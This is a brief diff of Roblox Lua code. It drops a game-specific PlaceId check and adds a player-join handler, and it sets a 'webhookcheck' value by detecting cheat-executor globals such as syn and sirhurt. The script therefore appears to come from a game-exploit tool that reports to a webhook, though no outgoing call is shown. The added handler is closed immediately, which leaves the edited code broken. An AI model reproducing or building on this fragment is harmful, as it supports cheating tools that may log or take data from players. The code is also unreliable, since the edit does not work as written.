@@ -1,5 +1,7 @@
-if game.PlaceId == 6284583030 then
-    
+
+game.Players.PlayerAdded:Connect(function(plr)
+    local character = plr.Character or plr.CharacterAdded:Wait()
+        end)
        
         local webhookcheck =
         is_sirhurt_closure and "s" or pebc_execute and "p" or syn and "s" or
